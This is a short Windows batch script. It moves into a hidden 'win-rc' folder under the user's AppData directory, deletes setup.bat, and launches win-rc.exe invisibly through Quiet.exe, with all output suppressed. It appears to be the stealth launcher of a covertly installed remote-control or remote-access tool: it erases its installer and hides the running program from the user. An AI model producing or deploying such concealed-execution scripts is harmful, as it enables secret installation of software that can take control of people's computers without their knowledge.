@echo off
cd %appdata%\win-rc\ >nul 2>&1
del setup.bat >nul 2>&1
bin\Quiet\Quiet.exe win-rc.exe >nul 2>&1